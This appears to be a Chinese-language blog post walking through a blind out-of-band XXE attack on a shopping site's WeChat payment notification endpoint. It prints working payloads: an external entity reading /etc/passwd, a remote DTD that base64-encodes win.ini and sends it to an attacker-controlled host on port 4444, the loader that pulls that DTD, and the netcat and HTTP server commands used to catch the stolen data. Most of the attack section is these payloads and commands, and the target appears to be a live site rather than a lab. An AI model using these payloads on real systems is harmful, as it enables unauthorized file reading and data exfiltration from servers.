# -实战xxe
原理:
XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</br>
具体学习:https://www.jianshu.com/p/77f2181587a4</br>
### 实战开始:
首先目标是一个商城网站,微信支付处存在xml传输 /plugin/payment/wechat/notify_url.php</br>
传入正常的xml进行探测:</br>
```
<?xml version="1.0"?>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2018-10-01</date>
      <description>XML is the best!</description>
   </core>
</catalog>
```
返回结果</br>
![1.jpg](https://i.loli.net/2019/06/10/5cfdde5d7fe3416843.jpg)</br>

正常响应</br>
传入攻击payload读取文件</br>
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd "file:///etc/passwd">]>
<foo>
        <value>&passwd;</value>
</foo>

```
也是正常响应但无回显</br>
说明此处利用应该要用 Blind OOB XXE（使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据）</br>
准备一台远程服务器  上面编辑好dtd文件准备被目标连接读取</br>
dtd文件内容</br>
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:4444?p=%file;'>">
```
![2.jpg](https://i.loli.net/2019/06/10/5cfdde5d4a32b42833.jpg)</br>
对目标服务器进行xxe攻击</br>
```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>
```
![5cfde3e8869c320141.jpg.jpg](https://i.loli.net/2019/06/10/5cfde3e8869c320141.jpg)</br>
于此同时服务器开启80端口 和 监听4444端口</br>
命令如下</br>
```
nc -lvv 4444
ctrl z
bg
python -m SimpleHTTPServer 80
```
![6.jpg](https://i.loli.net/2019/06/10/5cfdde5d6b21058186.jpg)</br>
对目标发送请求，服务器收到回显</br>
![7.jpg](https://i.loli.net/2019/06/10/5cfddff85862528530.jpg)</br>
base64解码</br>
![4.jpg](https://i.loli.net/2019/06/10/5cfdde5d545e486392.jpg)</br>
